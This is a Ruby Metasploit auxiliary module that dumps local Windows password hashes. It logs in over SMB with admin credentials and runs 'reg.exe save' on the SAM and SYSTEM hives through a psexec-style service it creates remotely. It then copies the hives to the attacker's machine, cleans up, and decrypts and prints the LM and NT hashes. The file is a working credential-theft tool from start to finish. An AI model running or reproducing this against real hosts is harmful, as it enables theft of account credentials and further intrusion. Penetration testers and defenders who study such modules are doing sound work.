#!/usr/bin/env ruby

require 'msf/core'
require 'rex'
require 'rex/registry'
require 'fileutils'

class Metasploit3 < Msf::Auxiliary

	# Exploit mixins should be called first
	include Msf::Exploit::Remote::SMB
	include Msf::Exploit::Remote::SMB::Authenticated
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner
	include Msf::Exploit::Remote::DCERPC

	# Aliases for common classes
	SIMPLE = Rex::Proto::SMB::SimpleClient
	XCEPT  = Rex::Proto::SMB::Exceptions
	CONST  = Rex::Proto::SMB::Constants

	def initialize
		super(
			'Name'        => 'SMB - Grab Local User Hashes',
			'Version'     => '$Revision: 14976 $',
			'Description' => %Q{
				This module extracts local user account password hashes from the SAM and SYSTEM hive files by authenticating
				to the target machine and downloading a copy of the hives.  The hashes are extracted offline on the attacking machine.  This all happenes without popping a shell or uploading
				anything to the target machine.  Local Admin credentials (password -or- hash) are required
			},
			'Author'      =>
				[
					'Royce Davis <rdavis[at]accuvant.com>',    # Metasploit module
					'Twitter: <[at]R3dy__>',
				],
			'References'  => [
				['URL', 'http://www.pentestgeek.conm'],
				['URL', 'http://www.accuvant.com'],
				['URL', 'http://sourceforge.net/projects/smbexec/'],
			],
			'License'     => MSF_LICENSE
		)

		register_options([
			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
			OptString.new('LOGDIR', [true, 'This is a directory on your local attacking system used to store Hive files and hashes', '/tmp/msfhashes']),
			OptString.new('RPORT', [true, 'The Target port', 445]),
		], self.class)

		deregister_options('RHOST')
		datastore['LOGDIR'] += "#{Time.new.strftime("%Y-%m-%d-%H%M%S")}"
	end



	#----------------------------------------
	# This is the main controller function
	#----------------------------------------
	def run_host(ip)
		sampath = "#{Rex::Text.rand_text_alpha(20)}"
		syspath = "#{Rex::Text.rand_text_alpha(20)}"
		#logdir = "#{datastore['LOGDIR']}/#{Time.now.strftime("%Y-%m-%d-%H%M%S")}"
		logdir = datastore['LOGDIR']
		#::FileUtils.mkdir_p(logdir) unless ::File.exists?(logdir)
		hives = [sampath, syspath]
		smbshare = datastore['SMBSHARE']
		
		#Try and Connect to the target
		begin
			connect()
		rescue 
			return
		end

		#Try and authenticate with given credentials
		begin
			smb_login()
		rescue StandardError => autherror
			print_error("#{ip} - #{autherror}")
			return
		end
		
		begin
			save_reg_hives(smbshare, ip, sampath, syspath)
			print_status("#{ip} - Downloading SYSTEM and SAM hive files.")
			download_hives(smbshare, sampath, syspath, ip, logdir)
			cleanup_after(smbshare, ip, sampath, syspath)
			sys, sam = open_hives(logdir, ip, hives)
			dump_creds(sam, sys, ip)
			simple.connect(smbshare)
			disconnect()			
		rescue StandardError => bang
			print_error("#{ip} - There was an error #{bang}")
			return bang
		end
	end

	
	
	#--------------------------------------------------------------------------------------------------------
	# This method attempts to use reg.exe to generate copies of the SAM and SYSTEM, registry hives
	# and store them in the Windows Temp directory on the remote host
	#--------------------------------------------------------------------------------------------------------
	def save_reg_hives(smbshare, ip, sampath, syspath)
		print_status("#{ip} - Creating hive copies.")
		begin
			# Try to save the hive files
			simple.connect(smbshare)
			command = "C:\\WINDOWS\\SYSTEM32\\cmd.exe /C reg.exe save HKLM\\SAM C:\\WINDOWS\\Temp\\#{sampath} && reg.exe save HKLM\\SYSTEM C:\\WINDOWS\\Temp\\#{syspath}"
			psexec(smbshare, command)
		rescue StandardError => saveerror
			print_error("#{ip} - Unable to create hive copies with reg.exe: #{saveerror}")
			simple.disconnect(smbshare)
			return saveerror
		end
	end



	#-----------------------------------------------------------------------------
	# Method used to copy hive files from C:\WINDOWS\Temp* on the remote host
	# To the local file path specified in datastore['LOGDIR'] on attacking system
	#-----------------------------------------------------------------------------
	def download_hives(smbshare, sampath, syspath, ip, logdir)
		begin
			newdir = "#{logdir}/#{ip}"
			::FileUtils.mkdir_p(newdir) unless ::File.exists?(newdir)
			simple.connect("\\\\#{ip}\\#{smbshare}")
	
			# Get contents of hive file
			remotesam = simple.open("\\WINDOWS\\Temp\\#{sampath}", 'rob')
			remotesys = simple.open("\\WINDOWS\\Temp\\#{syspath}", 'rob')
			samdata = remotesam.read
			sysdata = remotesys.read
	
			# Save it to local file system
			localsam = File.open("#{logdir}/#{ip}/sam", "w+")
			localsys = File.open("#{logdir}/#{ip}/sys", "w+")
			localsam.write(samdata)
			localsys.write(sysdata)

			localsam.close
			localsys.close
			remotesam.close
			remotesys.close
			simple.disconnect("\\\\#{ip}\\#{smbshare}")
		rescue StandardError => copyerror
			print_error("#{ip} - Unable to download hive copies from. #{copyerror}")
			simple.disconnect("\\\\#{ip}\\#{smbshare}")
			return copyerror
		end
	end



	#-----------------------------------------------------------------------------------------------
	# This is the cleanup method.  deletes copies of the hive files from the windows temp directory
	#-----------------------------------------------------------------------------------------------
	def cleanup_after(smbshare, ip, sampath, syspath)
		print_status("#{ip} - Running cleanup on")
		begin
			# Try and do cleanup
			simple.connect(smbshare)
			cleanup = "C:\\WINDOWS\\SYSTEM32\\cmd.exe /C del /F /Q C:\\WINDOWS\\Temp\\#{sampath} C:\\WINDOWS\\Temp\\#{syspath}"
			psexec(smbshare, cleanup)
		rescue StandardError => cleanerror
			print_error("#{ip} - Unable to run cleanup, need to manually remove hive copies from windows temp directory: #{cleanerror}")
			return cleanerror
		end
	end
	
	
	
	#-------------------------------------------------------------------------------------------------------
	# This method should open up a hive file from yoru local system and allow interacting with it
	#-------------------------------------------------------------------------------------------------------
	def open_hives(path, ip, hives)
		print_status("#{ip} - Opening hives from on local Attack system")
		sys = Rex::Registry::Hive.new("#{path}/#{ip}/sys")
		sam = Rex::Registry::Hive.new("#{path}/#{ip}/sam")
		return sys, sam
	end



	#------------------------------------------------------------------------------
	# This method taken from tools/reg.rb  thanks bperry for all of your efforts!!
	#------------------------------------------------------------------------------
	def get_boot_key(hive)
		begin
			return if !hive.root_key
			return if !hive.root_key.name
			default_control_set = hive.value_query('\Select\Default').value.data.unpack("c").first
			bootkey = ""
			basekey = "\\ControlSet00#{default_control_set}\\Control\\Lsa"

			%W{JD Skew1 GBG Data}.each do |k|
				ok = hive.relative_query(basekey + "\\" + k)
				return nil if not ok
				tmp = ""
				0.upto(ok.class_name_length - 1) do |i|
					next if i%2 == 1

					tmp << ok.class_name_data[i,1]
				end
				bootkey << [tmp].pack("H*")
			end
	
			keybytes = bootkey.unpack("C*")				
			p = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
			scrambled = ""
			p.each do |i|
				scrambled << bootkey[i]
			end
			return scrambled
		rescue StandardError => bootkeyerror
			print_error("#{ip} - Error ubtaining bootkey. #{bootkeyerror}")
			return bootkeyerror
		end
	end



	#-----------------------------
	# More code from tools/reg.rb
	#-----------------------------
	def get_hboot_key(sam, bootkey)
		num = "0123456789012345678901234567890123456789\0"
		qwerty = "!@#\$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"
		account_path = "\\SAM\\Domains\\Account"
		accounts = sam.relative_query(account_path)
  
		f = nil
		accounts.value_list.values.each do |value|
			if value.name == "F"
				f = value.value.data
			end
		end

		raise "Hive broken" if not f
 
		md5 = Digest::MD5.digest(f[0x70,0x10] + qwerty + bootkey + num)
		rc4 = OpenSSL::Cipher::Cipher.new('rc4')
		rc4.key = md5
		return rc4.update(f[0x80,0x20])
	end



	#---------------------------------------------------------------------------------------------
	# Some of this taken from tools/reb.rb some of it is from hashdump.rb some of it is my own...
	#---------------------------------------------------------------------------------------------
	def dump_creds(sam, sys, ip)
		empty_lm = "aad3b435b51404eeaad3b435b51404ee"
		empty_nt = "31d6cfe0d16ae931b73c59d7e0c089c0"
		bootkey = get_boot_key(sys)
		hbootkey = get_hboot_key(sam, bootkey)
		print_status("#{ip} - Extracting hashes.")
		begin
			get_users(sam).each do |user|
				rid = user.name.to_i(16)
				hashes = get_user_hashes(user, hbootkey)			
				obj = []
				obj << get_user_name(user)
				obj << ":" 
				obj << rid
				obj << ":"
				if hashes[0].empty?
					hashes[0] = empty_lm
				else
					hashes[0] = hashes[0].unpack("H*")
				end
				if hashes[1].empty?
					hashes[1] = empty_nt
				else
					hashes[1] = hashes[1].unpack("H*")
				end
				obj << hashes[0]
				obj << ":"
				obj << hashes[1]
				obj << ":::"
				print_good("#{obj.join}")
			end
		rescue StandardError => dumpcreds
			vprint_error("#{ip} - Error extracting creds from hives. #{dumpcreds}")
			return dumpcreds
		end
	end



	#-------------------------------------------------------------------
	# Method extracts usernames from user keys, modeled after credddump
	#-------------------------------------------------------------------
	def get_user_name(user_key)
		v = ""
		user_key.value_list.values.each do |value|
			v << value.value.data if value.name == "V"
		end
		name_offset = v[0x0c, 0x10].unpack("<L")[0] + 0xCC
		name_length = v[0x10, 0x1c].unpack("<L")[0]
		
		return v[name_offset, name_length]
	end

	
	
	#-----------------------------
	# More code from tools/reg.rb
	#-----------------------------
	def get_users(sam_hive)
		begin
			# Get users from SAM hive
			users = []
			sam_hive.relative_query('\SAM\Domains\Account\Users').lf_record.children.each do |user_key|
				users << user_key unless user_key.name == "Names"
			end
		rescue StandardError => getuserserror
			print_error("#{ip} - Unable to retrieve users from SAM hive. Method get_users. #{getuserserror}")
			return getuserserror
		end
	end
	
	
	
	#-----------------------------
	# More code from tools/reg.rb
	#-----------------------------
	def get_user_hashes(user_key, hbootkey)
		rid = user_key.name.to_i(16)
		v = nil
		user_key.value_list.values.each do |value|
			v = value.value.data if value.name == "V"
		end
		hash_offset = v[0x9c, 4].unpack("<L")[0] + 0xCC
		lm_exists = (v[0x9c+4, 4].unpack("<L")[0] == 20 ? true : false)
		nt_exists = (v[0x9c+16, 4].unpack("<L")[0] == 20 ? true : false)
		lm_hash = v[hash_offset + 4, 16] if lm_exists
		nt_hash = v[hash_offset + (lm_exists ? 24 : 8), 16] if nt_exists
		return decrypt_hashes(rid, lm_hash || nil, nt_hash || nil, hbootkey)
	end
	
	
	
	#-----------------------------
	# More code from tools/reg.rb
	#-----------------------------
	def decrypt_hashes(rid, lm_hash, nt_hash, hbootkey)
		ntpwd = "NTPASSWORD\0"
		lmpwd = "LMPASSWORD\0"
		begin
			# Try to decrypt hashes
			hashes = []
			if lm_hash
				hashes << decrypt_hash(rid, hbootkey, lm_hash, lmpwd)
			else
				hashes << ""
			end
			if nt_hash
				hashes << decrypt_hash(rid, hbootkey, nt_hash, ntpwd)
			else
				hashes << ""
			end
			return hashes
		rescue StandardError => decrypthasherror
			print_error("#{ip} - Unable to decrypt hashes. Method: decrypt_hashes. #{decrypthasherror}")
			return decrypthasherror
		end
	end



	#---------------------------------------------
	# This code is taken straight from hashdump.rb
	#---------------------------------------------
	def decrypt_hash(rid, hbootkey, enchash, pass)
		begin
			des_k1, des_k2 = sid_to_key(rid)
		
			d1 = OpenSSL::Cipher::Cipher.new('des-ecb')
			d1.padding = 0
			d1.key = des_k1

			d2 = OpenSSL::Cipher::Cipher.new('des-ecb')
			d2.padding = 0
			d2.key = des_k2

			md5 = Digest::MD5.new
			md5.update(hbootkey[0,16] + [rid].pack("V") + pass)

			rc4 = OpenSSL::Cipher::Cipher.new('rc4')
			rc4.key = md5.digest
			okey = rc4.update(enchash)

			d1o  = d1.decrypt.update(okey[0,8])
			d1o << d1.final

			d2o  = d2.decrypt.update(okey[8,8])
			d1o << d2.final
			value = d1o + d2o
			return value
		rescue StandardError => desdecrypt
			print_error("#{ip} - Error while decrypting with DES. #{desdecrypt}")
			return desdecrypt
		end
	end


	
	#-----------------------------
	# More code from tools/reg.rb
	#-----------------------------
	def sid_to_key(sid)
		s1 = ""
		s1 << (sid & 0xFF).chr
		s1 << ((sid >> 8) & 0xFF).chr
		s1 << ((sid >> 16) & 0xFF).chr
		s1 << ((sid >> 24) & 0xFF).chr
		s1 << s1[0]
		s1 << s1[1]
		s1 << s1[2]
		s2 = s1[3] + s1[0] + s1[1] + s1[2]
		s2 << s2[0] + s2[1] + s2[2]

		return string_to_key(s1), string_to_key(s2)
	end
	
	
	#-----------------------------
	# More code from tools/reg.rb
	#-----------------------------
	def string_to_key(s)
	
		parity = [
			1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
			16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
			32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
			49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
			64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
			81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
			97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
			112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
			128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
			145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
			161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
			176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
			193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
			208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
			224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
			241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
		]
		
		key = []
		key << (s[0].unpack('C')[0] >> 1)
		key << ( ((s[0].unpack('C')[0]&0x01)<<6) | (s[1].unpack('C')[0]>>2) )
		key << ( ((s[1].unpack('C')[0]&0x03)<<5) | (s[2].unpack('C')[0]>>3) )
		key << ( ((s[2].unpack('C')[0]&0x07)<<4) | (s[3].unpack('C')[0]>>4) )
		key << ( ((s[3].unpack('C')[0]&0x0F)<<3) | (s[4].unpack('C')[0]>>5) )
		key << ( ((s[4].unpack('C')[0]&0x1F)<<2) | (s[5].unpack('C')[0]>>6) )
		key << ( ((s[5].unpack('C')[0]&0x3F)<<1) | (s[6].unpack('C')[0]>>7) )
		key << ( s[6].unpack('C')[0]&0x7F)
		
		0.upto(7).each do |i|
			key[i] = (key[i]<<1)
			key[i] = parity[key[i]]
		end
		
		return key.pack("<C*")
	end
	
	
	#------------------------------------------------------------------------------------------------------------------------
	# This code was stolen straight out of psexec.rb.  Thanks very much for all who contributed to that module!!
	# Instead of uploading and runing a binary.  This method runs a single windows command fed into the #{command} paramater
	#------------------------------------------------------------------------------------------------------------------------
	def psexec(smbshare, command)
		filename = "filename"
		servicename = "servicename"
		simple.disconnect(smbshare)

		simple.connect("IPC$")

		handle = dcerpc_handle('367abb81-9844-35f1-ad32-98f038001003', '2.0', 'ncacn_np', ["\\svcctl"])
		vprint_status("Binding to #{handle} ...")
		dcerpc_bind(handle)
		vprint_status("Bound to #{handle} ...")

		vprint_status("Obtaining a service manager handle...")
		scm_handle = nil
		stubdata =
			NDR.uwstring("\\\\#{rhost}") +
			NDR.long(0) +
			NDR.long(0xF003F)
		begin
			response = dcerpc.call(0x0f, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				scm_handle = dcerpc.last_response.stub_data[0,20]
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		displayname = "displayname"
		holdhandle = scm_handle
		svc_handle  = nil
		svc_status  = nil

		stubdata =
			scm_handle +
			NDR.wstring(servicename) +
			NDR.uwstring(displayname) +

			NDR.long(0x0F01FF) + # Access: MAX
			NDR.long(0x00000110) + # Type: Interactive, Own process
			NDR.long(0x00000003) + # Start: Demand
			NDR.long(0x00000000) + # Errors: Ignore
			NDR.wstring( command ) +
			NDR.long(0) + # LoadOrderGroup
			NDR.long(0) + # Dependencies
			NDR.long(0) + # Service Start
			NDR.long(0) + # Password
			NDR.long(0) + # Password
			NDR.long(0) + # Password
			NDR.long(0)  # Password
		begin
			vprint_status("Attempting to execute #{command}")
			response = dcerpc.call(0x0c, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				svc_handle = dcerpc.last_response.stub_data[0,20]
				svc_status = dcerpc.last_response.stub_data[24,4]
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		vprint_status("Closing service handle...")
		begin
			response = dcerpc.call(0x0, svc_handle)
		rescue ::Exception
		end

		vprint_status("Opening service...")
		begin
			stubdata =
				scm_handle +
				NDR.wstring(servicename) +
				NDR.long(0xF01FF)

			response = dcerpc.call(0x10, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				svc_handle = dcerpc.last_response.stub_data[0,20]
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		vprint_status("Starting the service...")
		stubdata =
			svc_handle +
			NDR.long(0) +
			NDR.long(0)
		begin
			response = dcerpc.call(0x13, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		vprint_status("Removing the service...")
		stubdata =
			svc_handle +
			NDR.wstring("C:\\WINDOWS\\Temp\\sam")
		begin
			response = dcerpc.call(0x02, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
		end

		vprint_status("Closing service handle...")
		begin
			response = dcerpc.call(0x0, svc_handle)
		rescue ::Exception => e
			print_error("Error: #{e}")
		end
			
		begin
			#print_status("Deleting \\#{filename}...")
			select(nil, nil, nil, 1.0)
			#This is not really useful but will prevent double \\ on the wire :)
		if datastore['SHARE'] =~ /.[\\\/]/
			simple.connect(smbshare)
			simple.delete("C:\\WINDOWS\\Temp\\sam")
		else
			simple.connect(smbshare)
			simple.delete("C:\\WINDOWS\\Temp\\sam")
		end

		rescue ::Interrupt
			raise $!
		rescue ::Exception
			#raise $!
		end
		simple.disconnect("IPC$")
		simple.disconnect(smbshare)
	end

end